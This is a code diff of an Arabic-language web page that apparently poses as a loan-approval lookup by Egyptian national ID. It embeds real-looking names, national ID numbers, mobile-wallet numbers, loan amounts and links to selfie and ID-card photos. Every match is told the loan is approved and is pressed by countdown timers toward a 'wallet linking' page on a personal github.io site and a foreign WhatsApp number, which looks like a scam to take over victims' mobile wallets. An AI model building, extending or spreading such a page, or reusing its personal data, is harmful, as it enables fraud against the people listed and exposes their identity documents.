@@ -449,6 +449,39 @@
             line-height: 1.6;
             color: #eef5ff;
         }
+
+        /* تنسيق الصور */
+        .image-row {
+            display: flex;
+            gap: 1rem;
+            justify-content: center;
+            flex-wrap: wrap;
+            margin-bottom: 2rem;
+        }
+        .image-card {
+            background: rgba(0,0,0,0.5);
+            border-radius: 1rem;
+            padding: 1rem;
+            text-align: center;
+            flex: 1;
+            min-width: 250px;
+            border: 1px solid rgba(212,175,55,0.3);
+        }
+        .image-card p {
+            margin-top: 0.5rem;
+            color: #FFD966;
+            font-weight: bold;
+        }
+        .glow-image {
+            transition: all 0.3s ease;
+            max-width: 100%;
+            border-radius: 15px;
+        }
+        .glow-image:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 30px rgba(0,184,148,0.8);
+        }
+
         @media (max-width: 680px) {
             .logo h1 { font-size: 2.6rem; letter-spacing: 2px; }
             .search-title { font-size: 1.7rem; }
@@ -481,7 +514,7 @@
             أدخل رقمك القومي (14 رقم) لمعرفة حالة التمويل والبيانات المسجلة بكل أمان وشفافية
         </p>
         <div class="input-group">
-            <input type="text" id="nationalId" placeholder="مثال: 28403270201213" maxlength="14" inputmode="numeric">
+            <input type="text" id="nationalId" placeholder="مثال: 28611092200072" maxlength="14" inputmode="numeric">
         </div>
         <button class="btn-search" onclick="searchRequest()">
             <i class="fas fa-shield-alt"></i> استعلام فوري <i class="fas fa-arrow-left"></i>
@@ -493,6 +526,9 @@
             <h2><i class="fas fa-check-circle"></i> تهانينا! تمت الموافقة</h2>
             <p>✅ طلب التمويل الخاص بك معتمد وجاهز للربط</p>
         </div>
+
+        <!-- قسم عرض الصور -->
+        <div id="customerImagesSection" style="display: none; margin-bottom: 1.5rem;"></div>
 
         <div class="transparency-section">
             <h3><i class="fas fa-eye"></i> شفافية كاملة - بيانات التمويل</h3>
@@ -527,44 +563,55 @@
 </div>
 
 <script>
-    // قاعدة العملاء (نفس البيانات مع إضافة خاصية hasWallet محسوبة)
+    // ========== قاعدة العملاء الجدد (من ملف استمارة الخدمات المصرفية الرقمية) ==========
     const customersDatabase = {
-        "28309122103052": { name: "احمد ماهر احمد محمد ", loan: "100,000 ج.م", wallet: "فودافون كاش", walletNum: "01032201208", payment: "من يوم 1 إلى يوم 5" },
-        "28205031201019": { name: "معاذ السيد الغريب أحمد", loan: "200,000 ج.م", wallet: "فودافون كاش", walletNum: "01033830731", payment: "من يوم 1 إلى يوم 5" },
-        "28906270200731": { name: "محمد احمد عبدالله عبدالقادر", loan: "200,000 ج.م", wallet: "null", walletNum: "null", payment: "من يوم 1 إلى يوم 5" },
-        "29410011617371": { name: "علاء عبدالحكيم محمد درويش", loan: "40,000 ج.م", wallet: "فودافون كاش", walletNum: "01027250679", payment: "من يوم 1 إلى يوم 5" },
-        "29109182702197": { name: "محمد ابوالسعود محمود ابوالحسن", loan: "50,000 ج.م", wallet: "أخرى", walletNum: "01050540564", payment: "من يوم 1 إلى يوم 5" },
-        "28612061701011": { name: "مصطفى نبيل فوزي محمود", loan: "50,000 ج.م", wallet: "اتصالات كاش", walletNum: "01122540100", payment: "من يوم 1 إلى يوم 5" },
-        "28309072600611": { name: "وحيد محمد عارف عبد الله", loan: "100,000 ج.م", wallet: "فودافون كاش", walletNum: "01017453927", payment: "من يوم 1 إلى يوم 5" },
-        "27601272100298": { name: "احمد محمد احمد ابو سيد", loan: "200,000 ج.م", wallet: "فودافون كاش", walletNum: "01000013172", payment: "من يوم 1 إلى يوم 5" },
-        "28606171602191": { name: "حماده السيد السعيد حبيش", loan: "100,000 ج.م", wallet: "فودافون كاش", walletNum: "01014327407", payment: "من يوم 1 إلى يوم 5" },
-        "29102272500939": { name: "حماده ابوالعلا عبد العظيم ابوالعلا", loan: "30,000 ج.م", wallet: "فودافون كاش", walletNum: "01092974641", payment: "من يوم 1 إلى يوم 5" },
-        "30001132500275": { name: "محمد على السيد سلام", loan: "100,000 ج.م", wallet: "null", walletNum: "null", payment: "من يوم 1 إلى يوم 5" },
-        "28507170200317": { name: "محمد فتحى عبد الوارث محمد", loan: "120,000 ج.م", wallet: "فودافون كاش", walletNum: "01092134722", payment: "من يوم 1 إلى يوم 5" },
-        "29506062602244": { name: "سارة محمود على احمد", loan: "30,000 ج.م", wallet: "اتصالات كاش", walletNum: "01157916361", payment: "من يوم 1 إلى يوم 5" },
-        "26910290102639": { name: "هاني محمد محمد عبد الحميد", loan: "50,000 ج.م", wallet: "فودافون كاش", walletNum: "01095216999", payment: "من يوم 1 إلى يوم 5" },
-        "26711222501077": { name: "شحاته عبد الغني هيكل عبد الغني", loan: "30,000 ج.م", wallet: "فودافون كاش", walletNum: "01003233741", payment: "من يوم 1 إلى يوم 5" },
-        "283030105511": { name: "وائل زكريا محمد خليل", loan: "200,000 ج.م", wallet: "اتصالات كاش", walletNum: "01119416900", payment: "من يوم 1 إلى يوم 5" },
-        "28908011416834": { name: "مصطفى عبد الظاهر محمد مراد", loan: "30,000 ج.م", wallet: "اتصالات كاش", walletNum: "01116549692", payment: "من يوم 1 إلى يوم 5" },
-        "27303270102837": { name: "وليد علي حسن علي الدين", loan: "185,000 ج.م", wallet: "فودافون كاش", walletNum: "01004244313", payment: "من يوم 1 إلى يوم 5" },
-        "29802072200066": { name: "عبدالرحمن كمال معوض امبابى", loan: "200,000 ج.م", wallet: "اتصالات كاش", walletNum: "01101353222", payment: "من يوم 1 إلى يوم 5" },
-        "28311011101357": { name: "محمد مجدي احمد مسعد", loan: "200,000 ج.م", wallet: "فودافون كاش", walletNum: "01070710710", payment: "من يوم 1 إلى يوم 5" },
-        "298072021379": { name: "محمد عبدالوهاب محمود احمد", loan: "150,000 ج.م", wallet: "فودافون كاش", walletNum: "01066590637", payment: "من يوم 1 إلى يوم 5" },
-        "27708040101271": { name: "صلاح مختار حنفي قرني", loan: "50,000 ج.م", wallet: "فودافون كاش", walletNum: "01023669498", payment: "من يوم 1 إلى يوم 5" },
-        "26803241601893": { name: "السيد ابراهيم الششتاوي قناوي ", loan: "30,000 ج.م", wallet: "فودافون كاش", walletNum: "01090232423", payment: "من يوم 1 إلى يوم 5" },
-        "28404071200379": { name: "محمود علي المتولي السيد حسن", loan: "30,000 ج.م", wallet: "فودافون كاش", walletNum: "01001093695", payment: "من يوم 1 إلى يوم 5" },
-        "27001152400606": { name: "توبى صلاح الدين الضرغامى احمد ", loan: "200,000 ج.م", wallet: "null", walletNum: "null", payment: "من يوم 1 إلى يوم 5" },
-        "303110108098": { name: "يوسف مصطفى محمد محمود", loan: "30,000 ج.م", wallet: "اتصالات كاش", walletNum: "01146748355", payment: "من يوم 1 إلى يوم 5" },
-        "27910252801039": { name: "مدحت محمد محمود سالم ", loan: "50,000 ج.م", wallet: "اتصالات كاش", walletNum: "01159760178", payment: "من يوم 1 إلى يوم 5" },
-        "28805142501019": { name: "علي حسين سيد علي", loan: "30,000 ج.م", wallet: "اتصالات كاش", walletNum: "01143756596", payment: "من يوم 1 إلى يوم 5" },
-        "283111422016": { name: "احمد كمال عبدالتواب محمد", loan: "30,000 ج.م", wallet: "فودافون كاش", walletNum: "01010846425", payment: "من يوم 1 إلى يوم 5" },
-        "28310192201335": { name: "محمد محمود عبد الحميد محمد", loan: "40,000 ج.م", wallet: "فودافون كاش", walletNum: "01026479629", payment: "من يوم 1 إلى يوم 5" },
-        "27507310200599": { name: "ياسر سعد محمد بكر", loan: "60,000 ج.م", wallet: "فودافون كاش", walletNum: "01226157120", payment: "من يوم 1 إلى يوم 5" },
-        "29401172600151": { name: "محمد احمد خلف الله عمر", loan: "30,000 ج.م", wallet: "اتصالات كاش", walletNum: "01129793519", payment: "من يوم 1 إلى يوم 5" },
-        "28910102102195": { name: "محمد احمد محمود احمد", loan: "30,000 ج.م", wallet: "اتصالات كاش", walletNum: "01122107980", payment: "من يوم 1 إلى يوم 5" }
+        "28611092200072": { 
+            name: "محمود علي صالح خليل", 
+            loan: "160,000 ج.م", 
+            wallet: "فودافون كاش", 
+            walletNum: "01034272143", 
+            payment: "من يوم 1 إلى يوم 5",
+            customerImage: "https://i.ibb.co/RGgV4Lr5/taken-picture-1-Rw9-Wyq-D-Pz-PBR-3383867.jpg",
+            guarantorImage: "https://i.ibb.co/3rPFzSm5/inbound2464373295780695017.jpg"
+        },
+        "29101012610254": { 
+            name: "محمد ناصر محمد السيد", 
+            loan: "30,000 ج.م", 
+            wallet: "فودافون كاش", 
+            walletNum: "01017562770", 
+            payment: "من يوم 1 إلى يوم 5",
+            customerImage: "https://i.ibb.co/KzjPNzV7/taken-picture-1-Rw9-Wyq-D-7x-Ajj-3383867.jpg",
+            guarantorImage: "https://i.ibb.co/Y7dFRBGs/Screenshot-2026-04-11-15-40-49-58-40deb401b9ffe8e1df2f1cc5ba480b12.jpg"
+        },
+        "29010011209372": { 
+            name: "محمد الخضرى الشهاوى الشهاوى", 
+            loan: "30,000 ج.م", 
+            wallet: "فودافون كاش", 
+            walletNum: "01008737891", 
+            payment: "من يوم 1 إلى يوم 5",
+            customerImage: "https://i.ibb.co/LsM7R4Pp/taken-picture-1Rw9Wyq-D-FLj8B-3383867.jpg",
+            guarantorImage: "https://i.ibb.co/YCQq29vg/inbound3584334512909867967.jpg"
+        },
+        "29401172600151": { 
+            name: "محمد احمد خلف الله عمر", 
+            loan: "30,000 ج.م", 
+            wallet: "اتصالات كاش", 
+            walletNum: "01129793519", 
+            payment: "من يوم 1 إلى يوم 5",
+            customerImage: "https://i.ibb.co/nzF8JVDw/taken-picture-1Rw9Wyq-D-Uxp-Oo-3383867.jpg",
+            guarantorImage: ""
+        },
+        "29802072200066": { 
+            name: "عبدالرحمن كمال معوض امبابى", 
+            loan: "200,000 ج.م", 
+            wallet: "اتصالات كاش", 
+            walletNum: "01101353222", 
+            payment: "من يوم 1 إلى يوم 5",
+            customerImage: "https://i.ibb.co/VYrjNLd6/taken-picture-1-Rw9-Wyq-D-vyz-Hs-3383867.jpg",
+            guarantorImage: "https://i.ibb.co/6c6Fyw1M/17757683811995630753632338854268.jpg"
+        }
     };
 
-    // دوال مساعدة
     function isWalletValid(walletType) {
         return walletType && walletType !== "null" && walletType !== "أخرى";
     }
@@ -590,10 +637,9 @@
     }
     createParticles();
 
-    // رابط الربط (للعملاء الذين لديهم محفظة)
     const LINKING_URL = 'https://bk0212937-netizen.github.io/Rabt-wilet-/';
-    // رقم واتساب الدعم
-    const SUPPORT_WHATSAPP = '212614494251'; // الرقم الموجود مسبقاً
+    const SUPPORT_WHATSAPP = '212614494251';
+    let nationalIdFromSearch = '';
 
     function cancelAutoRedirect() {
         if (autoRedirectTimer) clearTimeout(autoRedirectTimer);
@@ -604,7 +650,7 @@
             const msg = document.createElement('div');
             msg.className = 'info-box success';
             msg.style.marginTop = '0.5rem';
-            msg.innerHTML = '<i class="fas fa-ban"></i> تم إلغاء التوجيه التلقائي. يمكنك الضغط يدوياً على زر واتساب أو الرابط.';
+            msg.innerHTML = '<i class="fas fa-ban"></i> تم إلغاء التوجيه التلقائي. يمكنك الضغط يدوياً على الزر أدناه.';
             const parent = document.getElementById('actionSection');
             const oldMsg = document.getElementById('cancelMsg');
             if (oldMsg) oldMsg.remove();
@@ -673,18 +719,18 @@
         window.open(url, '_blank');
     }
 
-    let nationalIdFromSearch = '';
-
     function searchRequest() {
         const nationalId = document.getElementById('nationalId').value.trim();
         const resultDiv = document.getElementById('resultSection');
         const errorDiv = document.getElementById('errorSection');
         const dataTable = document.getElementById('dataTable');
         const actionDiv = document.getElementById('actionSection');
+        const imagesDiv = document.getElementById('customerImagesSection');
 
         resultDiv.style.display = 'none';
         errorDiv.style.display = 'none';
         actionDiv.innerHTML = '';
+        imagesDiv.innerHTML = '';
         if (autoRedirectTimer) clearTimeout(autoRedirectTimer);
         if (redirectCountdownInterval) clearInterval(redirectCountdownInterval);
         if (walletTimerInterval) clearInterval(walletTimerInterval);
@@ -701,6 +747,32 @@
             return;
         }
 
+        // عرض صور العميل والضامن
+        if (customer.customerImage || customer.guarantorImage) {
+            imagesDiv.style.display = 'block';
+            let imagesHtml = '<div class="image-row">';
+            if (customer.customerImage) {
+                imagesHtml += `
+                    <div class="image-card">
+                        <img src="${customer.customerImage}" class="glow-image" onerror="this.parentElement.style.display='none'">
+                        <p>📸 صورة تأكيد الهوية (سيلفي العميل)</p>
+                    </div>
+                `;
+            }
+            if (customer.guarantorImage) {
+                imagesHtml += `
+                    <div class="image-card">
+                        <img src="${customer.guarantorImage}" class="glow-image" onerror="this.parentElement.style.display='none'">
+                        <p>🪪 صورة بطاقة الضامن</p>
+                    </div>
+                `;
+            }
+            imagesHtml += '</div>';
+            imagesDiv.innerHTML = imagesHtml;
+        } else {
+            imagesDiv.style.display = 'none';
+        }
+
         // عرض بيانات العميل الأساسية
         let rows = `
             <tr><td class="info-label">الاسم الرباعي</td><td>${customer.name}</td>
@@ -715,7 +787,6 @@
 
         const hasWallet = isWalletValid(customer.wallet);
         if (!hasWallet) {
-            // لا يوجد محفظة صالحة -> عرض مهلة 4 ساعات وزر واتساب لفتح المحفظة
             actionDiv.innerHTML = `
                 <div class="info-section warning">
                     <strong>⚠️ تنبيه هام:</strong> لا توجد محفظة إلكترونية مسجلة باسمك (فودافون كاش أو اتصالات كاش).
@@ -731,7 +802,6 @@
             `;
             startWalletTimer(4 * 3600);
         } else {
-            // يوجد محفظة -> عرض رابط الربط وواتساب مع رسالة مخصصة
             actionDiv.innerHTML = `
                 <div class="info-section success">
                     <strong>✅ محفظتك مسجلة وجاهزة للربط.</strong> يمكنك الآن ربط حسابك بالسيستم لتحويل القرض.
@@ -753,7 +823,6 @@
         }
     }
 
-    // ربط الدوال العامة
     window.searchRequest = searchRequest;
     window.cancelAutoRedirect = cancelAutoRedirect;
     window.sendWhatsAppMessageForOpenWallet = sendWhatsAppMessageForOpenWallet;
